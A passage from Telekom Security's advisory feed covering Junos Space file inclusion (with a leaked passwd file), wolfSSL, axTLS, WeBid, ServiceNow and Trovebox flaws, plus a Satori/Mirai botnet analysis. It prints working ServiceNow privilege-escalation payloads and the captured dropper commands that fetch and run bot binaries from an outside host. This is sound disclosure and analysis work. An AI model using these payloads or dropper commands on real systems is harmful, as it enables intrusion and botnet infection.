+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Wed, 24 Apr 2019 13:32:31 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Frame-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SAMEORIGIN&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-XSS-Protection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Content-Type-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nosniff&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Strict-Transport-Security&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;max-age=63072000; includeSubdomains; preload&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Pragma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;No-cache&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;no-cache,no-store,must-revalidate,private&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Expires&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Thu, 01 Jan 1970 00:00:00 UTC&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;attachment; filename=&quot;passwd&quot;&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/octet-stream&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1345&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+mysql:x:499:499:MySQL server:/var/lib/mysql:/sbin/nologin
+cassandra:x:498:498::/var/lib/cassandra:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+gluster:x:497:497:GlusterFS daemons:/var/run/gluster:/sbin/nologin
+jboss:x:500:500::/usr/local/jboss:/bin/bash
+apache:x:48:48:Apache:/var/www:/sbin/nologin
+saslauth:x:496:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
+haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
+unbound:x:495:495:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+redis:x:494:494:Redis Server:/var/lib/redis:/sbin/nologin
+radvd:x:75:75:radvd user:/:/sbin/nologin
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+qemu:x:107:107:qemu user:/:/sbin/nologin
+slipstream:x:493:493::/usr/local//slipstream/:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+sshd:x:74:74::/var/empty/sshd:/sbin/nologin
+postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash
+tcpdump:x:72:72::/:/sbin/nologin
+pcap:x:77:77:::/sbin/nologin
+opennms:x:503:504::/home/opennms:/bin/bash
+cassandr:x:504:505::/home/cassandr:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;strong&gt;Michael Wollner&lt;/strong&gt; (&lt;a href=&quot;https://github.com/Ibonok&quot;&gt;@Ibonok&lt;/a&gt;)&lt;/p&gt;</content><author><name>Telekom Security</name></author><summary type="html">A Local File Inclusion vulnerability (CVE-2020-1611) in Juniper Networks Junos Space allows an attacker to view all files on the target when the device receives malicious HTTP packets.</summary></entry><entry><title type="html">wolfSSL TLSv1.3 Remote Buffer Overflow</title><link href="http://telekomsecurity.github.io//2019/05/wolfssl-buffer-overflow.html" rel="alternate" type="text/html" title="wolfSSL TLSv1.3 Remote Buffer Overflow" /><published>2019-05-20T00:00:00+02:00</published><updated>2019-05-20T00:00:00+02:00</updated><id>http://telekomsecurity.github.io//2019/05/wolfssl-buffer-overflow</id><content type="html" xml:base="http://telekomsecurity.github.io//2019/05/wolfssl-buffer-overflow.html">&lt;p&gt;A new critical remote buffer overflow vulnerability (CVE-2019-11873) was discovered in the wolfSSL library (version 4.0.0-stable, http://www.wolfssl.com) by Security Evaluators of Telekom Security with modern fuzzing methods. The vulnerability allows an attacker to overwrite a large part of the RAM of a wolfSSL server with hisdata over the network.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/advisories/20190520_remote-buffer-overflow-wolfssl_CVE-2019-11873.pdf&quot;&gt;View the full advisory&lt;/a&gt;&lt;/p&gt;</content><author><name>Telekom Security</name></author><summary type="html">A new critical remote buffer overflow vulnerability (CVE-2019-11873) was discovered in the wolfSSL library (version 4.0.0-stable, http://www.wolfssl.com) by Security Evaluators of Telekom Security with modern fuzzing methods. The vulnerability allows an attacker to overwrite a large part of the RAM of a wolfSSL server with hisdata over the network. View the full advisory</summary></entry><entry><title type="html">axTLS Remote Buffer Overflow</title><link href="http://telekomsecurity.github.io//2019/03/axtls-buffer-overflow.html" rel="alternate" type="text/html" title="axTLS Remote Buffer Overflow" /><published>2019-03-22T00:00:00+01:00</published><updated>2019-03-22T00:00:00+01:00</updated><id>http://telekomsecurity.github.io//2019/03/axtls-buffer-overflow</id><content type="html" xml:base="http://telekomsecurity.github.io//2019/03/axtls-buffer-overflow.html">&lt;p&gt;A new critical remote buffer overflow vulnerability (CVE-2019-8981) in the axTLS library for embedded devices (version 2.1.4, &lt;a href=&quot;http://axtls.scourceforge.net&quot;&gt;http://axtls.scourceforge.net&lt;/a&gt; was discovered on 2019 February 20 with modern fuzzing methods, which possibly allows remote code execution. A new fixed version (2.1.5) countering this is now available for download.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/advisories/20190322_remote-buffer-overflow-in-a-axtls.pdf&quot;&gt;View the full advisory&lt;/a&gt;&lt;/p&gt;</content><author><name>Telekom Security</name></author><summary type="html">A new critical remote buffer overflow vulnerability (CVE-2019-8981) in the axTLS library for embedded devices (version 2.1.4, http://axtls.scourceforge.net was discovered on 2019 February 20 with modern fuzzing methods, which possibly allows remote code execution. A new fixed version (2.1.5) countering this is now available for download. View the full advisory</summary></entry><entry><title type="html">WeBid Directory Traversal, Blind SQL Injection and XSS</title><link href="http://telekomsecurity.github.io//2018/12/webid-multiple-vulnerabilities.html" rel="alternate" type="text/html" title="WeBid Directory Traversal, Blind SQL Injection and XSS" /><published>2018-12-03T00:00:00+01:00</published><updated>2018-12-03T00:00:00+01:00</updated><id>http://telekomsecurity.github.io//2018/12/webid-multiple-vulnerabilities</id><content type="html" xml:base="http://telekomsecurity.github.io//2018/12/webid-multiple-vulnerabilities.html">&lt;p&gt;Multiple vulnerabilities were identified in version 1.2.2 of the popular “WeBid” open source auction system. Patches for all three vulnerabilities are available in their GitHub, and will be included in the next release.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/advisories/20181108_WeBid_Multiple_Vulnerabilities.txt&quot;&gt;View the full advisory&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                          Telekom Security
+                        security.telekom.com
+
+     Advisory: WeBid - Directory Traversal (Arbitrary Image File Read),
+               Blind SQL Injection and Reflected Cross Site Scripting
+ Release Date: 2018-12-03
+       Author: Nils Stünkel &amp;lt;nils.stuenkel@t-systems.com&amp;gt;
+          CVE: CVE-2018-1000867, CVE-2018-1000868, CVE-2018-1000882
+
+  Application: WeBid, up to version 1.2.2
+         Risk: Medium
+Vendor Status: Fix committed
+
+
+Overview:
+
+  From webidsupport.com:
+  &quot;WeBid provides open source auction software which has been used around
+  the world and has been downloaded over 100,000 times. It will allow you to
+  quickly set up your own auction site and get started straight away.&quot;
+
+  Multiple vulnerabilities were identified version 1.2.2 of the WeBid auction
+  system.
+  A Directory Traversal vulnerability allows an unauthenticated, remote
+  attacker to read any PNG, JPEG or BMP image files that are accessible to
+  the server. In certain PHP configurations, this could also be used to issue
+  arbitrary requests against a other systems over HTTP, HTTPS, FTP or other
+  protocols, enabling unintended network boundary traversal.
+  Blind SQL injections were found in five scripts related to the &quot;Your Auctions&quot;
+  functionality. An authenticated attacker could use these vulnerabilities to
+  read data from the database, like password hashes or other secrets.
+  Two Cross Site Scripting (XSS) vulnerabilities were also found, one of them
+  in the user login page.
+
+  Fixes for all three vulnerabilities have been committed to the Github
+  Repository on Nov 22nd, 2018 [7].
+
+
+Details:
+
+  1) Directory Traversal (Arbitrary Image File Read)
+    In WeBid, the getthumb.php script handles the creation, caching and
+    delivery of image thumbnails as they are requested by a client. However,
+    no sanitization or boundary checking takes place on the 'fromfile' parameter
+    value. An attacker can pass directory traversal tokens like '../' and have
+    the application read and return arbitrary image files from the local file
+    system. The vulnerability was reported to the project via their Mantis,
+    the issue no. is 646[1].
+
+    $fromfile = (isset($_GET['fromfile'])) ? $_GET['fromfile'] : '';
+    $img = @getimagesize($fromfile);
+    /* some more image format detection, setting $image_type and $output_type
+    appropriately */
+    load_image($fromfile, $img['mime'], $image_type, $output_type);
+    /* load_image passes $fromfile to the corresponding imagecreatefrom*
+    function and returns the resulting image to the client */
+
+    If allow_url_include[2] is enabled in PHP, the attacker could use PHP
+    protocol wrappers[3] to initiate outgoing connections from the web server,
+    e.g. towards a protected network, and possibly exfiltrate data. There
+    is currently no recommendation in the official WeBid documentation[4]
+    to disable allow_url_include.
+    When file types are requested that are not images, the vulnerability still
+    allows the attacker to determine the presence of files on the system,
+    as the error messages differ when the target file cannot be parsed
+    (&quot;Incorrect file type&quot;), vs. when it doesn't exist (&quot;Image not found&quot;).
+
+
+  2) Multiple Authenticated Blind SQL Injection Vulnerabilities
+    A number of scripts are passing unsanitized parameter values to the database,
+    and can therefore be leveraged for blind SQL injection. A user has to be
+    logged in for these vulnerabilities to be exploitable. This vulnerability
+    was reported as issue no. 647[5].
+
+    The following scripts and parameters are exploitable:
+
+    Script                | Parameter
+    ----------------------+------------
+    yourauctions.php      | oa_ord
+    yourauctions_c.php    | ca_ord
+    yourauctions_p.php    | pa_ord
+    yourauctions_s.php    | sa_ord
+    yourauctions_sold.php | solda_ord
+
+
+    // One possible code path copies the GET parameters into the session:
+    $_SESSION['oa_ord'] = $_GET['oa_ord'];
+    $_SESSION['oa_type'] = $_GET['oa_type'];
+
+    // then the query is constructed
+    $query = &quot;SELECT * FROM &quot; . $DBPrefix . &quot;auctions
+    WHERE user = :user_id AND closed = 0
+    AND starts &amp;lt;= CURRENT_TIMESTAMP AND suspended = 0
+    ORDER BY &quot; . $_SESSION['oa_ord'] . &quot; &quot; . $_SESSION['oa_type'] . &quot; LIMIT
+    :offset, :perpage&quot;;
+
+    // and executed
+    $db-&amp;gt;query($query, $params);
+
+
+  3) Multiple Cross Site Scripting Vulnerabilities
+    The scripts 'user_login.php' and 'register.php' were found to be vulnerable
+    for Script Injection Attacks. When their respective action fails, their
+    form fields are echoed back to client without any sanitization, allowing
+    arbitrary JavaScript or Markup to be injected in the process. This
+    vulnerability was reported as issue no. 648[6].
+    
+    From user_login.php:
+    $template-&amp;gt;assign_vars(array(
+        'ERROR' =&amp;gt; (isset($ERR)) ? $ERR : '',
+        'USER' =&amp;gt; (isset($_POST['username'])) ? $_POST['username'] : ''
+        ));
+        
+
+References:
+
+  [1]: http://bugs.webidsupport.com/view.php?id=646
+  [2]: http://php.net/manual/en/features.remote-files.php
+  [3]: http://php.net/manual/en/wrappers.php
+  [4]: http://docs.webidsupport.com/build/html/installation.html
+  [5]: http://bugs.webidsupport.com/view.php?id=647
+  [6]: http://bugs.webidsupport.com/view.php?id=648
+  [7]: https://github.com/renlok/WeBid/commit/256a5f9d3eafbc477dcf77c7682446cc4b449c7f
+
+
+Disclosure Timeline:
+
+  08. November   2018 - Directory Traversal Discovered
+  09. November   2018 - SQL Injection and XSS Discovered
+  09. November   2018 - Vendor Contact Requested
+  12. November   2018 - Reported Issues to Vendor via their Mantis
+  22. November   2018 - Fixes committed to Github[7]
+  03. December   2018 - Advisory published
+
+
+About Telekom Security:
+
+  Telekom Security is the security provider for Deutsche Telekom and Deutsche
+  Telekom customers.
+
+  https://telekomsecurity.github.io
+  https://security.telekom.com
+  http://www.sicherheitstacho.eu
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Telekom Security</name></author><summary type="html">Multiple vulnerabilities were identified in version 1.2.2 of the popular “WeBid” open source auction system. Patches for all three vulnerabilities are available in their GitHub, and will be included in the next release.</summary></entry><entry><title type="html">ServiceNow Glide scripting injection leading to privilege escalation</title><link href="http://telekomsecurity.github.io//2018/07/servicenow-privilege-escalation.html" rel="alternate" type="text/html" title="ServiceNow Glide scripting injection leading to privilege escalation" /><published>2018-07-27T00:00:00+02:00</published><updated>2018-07-27T00:00:00+02:00</updated><id>http://telekomsecurity.github.io//2018/07/servicenow-privilege-escalation</id><content type="html" xml:base="http://telekomsecurity.github.io//2018/07/servicenow-privilege-escalation.html">&lt;p&gt;ServiceNow, an enterprise IT service management solution, is vulnerable to an template
+injection vulnerability, leading to a full privilege escalation.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/advisories/20180104_ServiceNow_GlideInjection.txt&quot;&gt;View the full advisory&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                          Telekom Security
+                        security.telekom.com
+
+     Advisory: ServiceNow Glide scripting injection leading to privilege escalation
+ Release Date: 2018/07/27
+       Author: Robin Verton (robin.verton@telekom.de)
+          CVE: CVE-2018-7748
+
+  Application: ServiceNow &amp;lt;= Release 'Jakarta' Patch 8
+         Risk: Critical
+Vendor Status: 'Jakarta' Patch 8a was released to fix this vulnerability.
+
+
+Overview:
+
+  &quot;The Now Platform delivers a System of Action for the enterprise. Using a
+  single data model, it’s easy to create contextual workflows and automate any
+  business process. Anyone, from the business user to the professional
+  developer, can easily build applications at lightspeed.
+  
+  Any application user on the Now Platform can make requests through service
+  catalogs, find information in common knowledge bases, and be notified about
+  the actions and information they care about the most.&quot;[1]
+
+Details:
+
+  The /report_viewer.do endpoint is prone to a glide script injection
+  vulnerability.  It is possible to inject glide code (scripting language) by
+  submitting a string in the format '${xyz}' in the sysparm_media parameter. To
+  successfully exploit this, an authenticated user is required and any valid
+  report id. The following steps will escalate the current user privileges to
+  the 'admin' role. This is possible by doing three GlideRecord actions to query
+  the database:
+
+   a) Get the current users sys_id.
+      ${gs.getUserID()}
+
+   b) Get the sys_id for the admin role.
+      ${u=new GlideRecord(&quot;sys_user_role&quot;);u.addQuery(&quot;name&quot;,&quot;admin&quot;);
+      u.query();u.next();u.getValue(&quot;sys_id&quot;)}
+
+   c) Add admin role from (b) to own record.
+      ${gr=new GlideRecord(&quot;sys_user_has_role&quot;);gr.initialize();
+      gr.user=&quot;&amp;lt;user_id&amp;gt;&quot;;gr.role=&quot;&amp;lt;role_id&amp;gt;&quot;;gr.insert();}
+
+  This is only one example of what could be injected, leading to the highest
+  available permissions. A lot of different things can be done by injection of
+  Glide code.
+
+References:
+
+  [1]: https://www.servicenow.com/why-servicenow.html
+
+Disclosure Timeline:
+
+  04. January     2018 - Details sent to vendor.
+  10. January     2018 - Vendor provided patch for verification.
+  15. March       2018 - Vendor released patch.
+  27. July        2018 - Advisory published.
+
+About Telekom Security:
+
+  Telekom Security is the security provider for Deutsche Telekom and Deutsche
+  Telekom customers.
+
+  https://security.telekom.com
+  https://github.com/telekomsecurity
+  http://www.sicherheitstacho.eu
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Telekom Security</name></author><summary type="html">ServiceNow, an enterprise IT service management solution, is vulnerable to an template injection vulnerability, leading to a full privilege escalation.</summary></entry><entry><title type="html">Satori/Mirai botnet detected</title><link href="http://telekomsecurity.github.io//2018/07/adb-botnet.html" rel="alternate" type="text/html" title="Satori/Mirai botnet detected" /><published>2018-07-10T00:00:00+02:00</published><updated>2018-07-10T00:00:00+02:00</updated><id>http://telekomsecurity.github.io//2018/07/adb-botnet</id><content type="html" xml:base="http://telekomsecurity.github.io//2018/07/adb-botnet.html">&lt;p&gt;On the 10th of July at 23:30 UTC we noticed an increased traffic on our &lt;a href=&quot;http://sicherheitstacho.eu/start/main&quot;&gt;blackhole monitoring&lt;/a&gt; on TCP port 5555. Upon further analysis, we saw a big chunk of this traffic coming from China, USA and the Dominican Republic. In total we gathered &lt;strong&gt;246.434 packets&lt;/strong&gt; from &lt;strong&gt;68.361 unique IPs&lt;/strong&gt;. Based on the packet details we gathered, we can assume that the packets were generated by a lot of different devices. In addition, the traffic behavior on port 5555 matches the typicall scan behavior of botnets.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://telekomsecurity.github.io//assets/images/adb-botnet-g1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;inspecting-the-payload-and-stumbling-on-old-friends&quot;&gt;Inspecting the payload and stumbling on old friends&lt;/h3&gt;
+
+&lt;p&gt;The payload registered and captured by out T-Pot honeypots (35.204) looks like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CNXN 2 host::OPEN ]+shell:&amp;gt;/sdcard/Download/f &amp;amp;&amp;amp; cd /sdcard/Download/;
+&amp;gt;/dev/f &amp;amp;&amp;amp; cd /dev/; busybox wget http://95.215.62.169/adbs -O -&amp;gt; adbs; sh adbs; rm adbs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The first chars of this payload are Android Debug Bridge (ADB) commands, used for initiating a connection to a debug channel. This connection is then used to execute a shell command.&lt;/p&gt;
+
+&lt;p&gt;Let’s examine the command:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;/sdcard/Download/f &amp;amp;&amp;amp; cd /sdcard/Download/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Short shell builtin for clearing (or touching) the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;gt;/sdcard/Download/f&lt;/code&gt; and changing to this folder.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;/dev/f &amp;amp;&amp;amp; cd /dev/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Same as above, just with a different file (and folder).&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;busybox wget http://95.215.62.169/adbs -O -&amp;gt; adbs; sh adbs; rm adbs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Download &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adbs&lt;/code&gt; from dropper server, execute it and remove it. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rm&lt;/code&gt; is used to cover up tracks and only keep the bot/malware in memory.&lt;/p&gt;
+
+&lt;p&gt;Searching for this IP reveals it was already &lt;a href=&quot;http://blog.netlab.360.com/botnets-never-die-satori-refuses-to-fade-away-en/&quot;&gt;detected some time ago&lt;/a&gt; in correlation to the Satori botnet.&lt;/p&gt;
+
+&lt;h3 id=&quot;analyzing-the-dropped-file&quot;&gt;Analyzing the dropped file&lt;/h3&gt;
+
+&lt;p&gt;The downloaded &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adbs&lt;/code&gt; shellscript looks like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/sh
+
+n=&quot;arm.bot.le mips.bot.be mipsel.bot.le arm7.bot.le x86_64.bot.le i586.bot.le i686.bot.le&quot;
+http_server=&quot;95.215.62.169&quot;
+
+for a in $n
+do
+    cp /system/bin/sh $a
+    &amp;gt;$a
+    busybox wget http://$http_server/adb/$a -O -&amp;gt; $a
+    chmod 777 $a
+    ./$a
+done
+
+for a in $n
+do
+    rm $a
+done
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is a simple script to download the malware compiled for different architectures and execute them (all one by one). Dirty approach – but works.&lt;/p&gt;
+
+&lt;h3 id=&quot;another-variant-of-satori&quot;&gt;Another variant of Satori?&lt;/h3&gt;
+
+&lt;p&gt;Having a deeper look at the downloaded binaries, this looks like another modified version of Mirai or Satori, adjusted to exploit public available ADB devices. Heading over to VirusTotal, only five engines detect this binary (ELF;Mira-RQ) until now. First date of detection: 2018-07-09 09:20.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://telekomsecurity.github.io//assets/images/adb-botnet-vt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can find the same &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;table_unlock&lt;/code&gt; function mentioned in the &lt;a href=&quot;http://blog.netlab.360.com/botnets-never-die-satori-refuses-to-fade-away-en/&quot;&gt;previous linked blog article&lt;/a&gt;, indicating a variant or at least code shared between the two. Compare this screenshot from the blog post:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://telekomsecurity.github.io//assets/images/adb-botnet-tableUnlock2-360.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With what we can find in the new binary:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://telekomsecurity.github.io//assets/images/adb-botnet-tableUnlock2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As usualy seen in a Mirai bot, strings are “encrypted” with a simple XOR. Decrypting with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x31&lt;/code&gt; leads to the following results:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOLNOGTFO – kills bot [1]
+KILLATTK - kills any ongoing attacks [1]
+GETSPOOFS - ???
+GAYFGT – sth. reporting related? [1]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And the following domains:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;i.rippr.cc -&amp;gt; 95.215.62.169 (TXT record)
+p.rippr.cc -&amp;gt; 180.101.204.161 (TXT record)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;[1] Similar commands found &lt;a href=&quot;http://dosattack.net/2015/09/13/Is-your-router-part-of-a-botnet.html&quot;&gt;here&lt;/a&gt; on a  blog.&lt;/p&gt;
+
+&lt;h2 id=&quot;files&quot;&gt;Files&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://95.215.62.169/i686.bot.le - 1eddee13762d7996c02b4c57fa3f8ffc
+2. http://95.215.62.169/arm.bot.le - d01f194c374eebb9235291e34bc0d185
+3. http://95.215.62.169/arm7.bot.le - d10c1591aee800a5f37f654f1ecd20a8
+4. http://95.215.62.169/x86_64.bot.le - 4e4fc7e7599e5bd07e097a2f313486fe
+5. http://95.215.62.169/mips.bot.be - a18b0d1401305588107e58054e6aa2ab
+6. http://95.215.62.169/mipsel.bot.le - 9689cc9fe613b735fa1d386dffcdd6d8
+7. http://95.215.62.169/i586.bot.le - 61f0bad58d28e73d1ef29b9574d28e41
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://blog.netlab.360.com/botnets-never-die-satori-refuses-to-fade-away-en/&quot;&gt;http://blog.netlab.360.com/botnets-never-die-satori-refuses-to-fade-away-en/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://dosattack.net/2015/09/13/Is-your-router-part-of-a-botnet.html&quot;&gt;http://dosattack.net/2015/09/13/Is-your-router-part-of-a-botnet.html&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Telekom Security</name></author><summary type="html">On the 10th of July at 23:30 UTC we noticed an increased traffic on our blackhole monitoring on TCP port 5555. Upon further analysis, we saw a big chunk of this traffic coming from China, USA and the Dominican Republic. In total we gathered 246.434 packets from 68.361 unique IPs. Based on the packet details we gathered, we can assume that the packets were generated by a lot of different devices. In addition, the traffic behavior on port 5555 matches the typicall scan behavior of botnets.</summary></entry><entry><title type="html">Trovebox - Authentication Bypass, SQLi, SSRF</title><link href="http://telekomsecurity.github.io//2018/04/trovebox-vulnerabilities.html" rel="alternate" type="text/html" title="Trovebox - Authentication Bypass, SQLi, SSRF" /><published>2018-04-30T00:00:00+02:00</published><updated>2018-04-30T00:00:00+02:00</updated><id>http://telekomsecurity.github.io//2018/04/trovebox-vulnerabilities</id><content type="html" xml:base="http://telekomsecurity.github.io//2018/04/trovebox-vulnerabilities.html">&lt;p&gt;Trovebox, a photo sharing and management application, is prone to several critical
+vulnerabilities. Exploiting is trivial and it is recommended to update
+to the fixed version from Github.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/advisories/20180430_Trovebox.txt&quot;&gt;View the full advisory&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                          Telekom Security
+                        security.telekom.com
+
+     Advisory: Trovebox - Authentication Bypass, SQLi, SSRF
+ Release Date: 2018/04/30
+       Author: Robin Verton (robin.verton@telekom.de)
+          CVE: CVE-2018-1000551, CVE-2018-1000552,
+               CVE-2018-1000553, CVE-2018-1000554
+
+  Application: Trovebox &amp;lt;= 4.0.0-rc6
+         Risk: Critical
+Vendor Status: A fix was released on github.
+
+Overview:
+
+  &quot;Trovebox is software that helps you manage, organize and share photos. It
+  includes web and mobile apps for Android and iOS. The goal of Trovebox is to
+  be software which people love to use and helps them preserve their digial
+  media files.&quot; [1]
+
+  Multiple vulnerabilities were identified in the current release of Trovebox
+  allowing to bypass authentication, inject SQL code or access local services
+  and hosts.
+
+Details:
+
+  1) Authentication bypass via type juggling
+
+    Trovebox puts JSON serialized data in a table column and deserializes this
+    data when accessing it. If an accessed dictionary key can not be found in
+    this result, bool(false) is returned. The passwordReset() function makes use
+    of an unsafe comparison which allows to pass this check if there is no
+    active token saved for the user:
+
+      //ApiUserController.php, L89
+      $user = new User;
+      $token = $_POST['token'];
+      $password = $_POST['password'];
+      $passwordConfirm = $_POST['password-confirm'];
+      $tokenFromDb = $user-&amp;gt;getAttribute('passwordToken');
+      if($tokenFromDb != $token)
+        return $this-&amp;gt;error('Could not validate password reset token.', false);
+
+    Note that this will always reset the password for the owner/admin account,
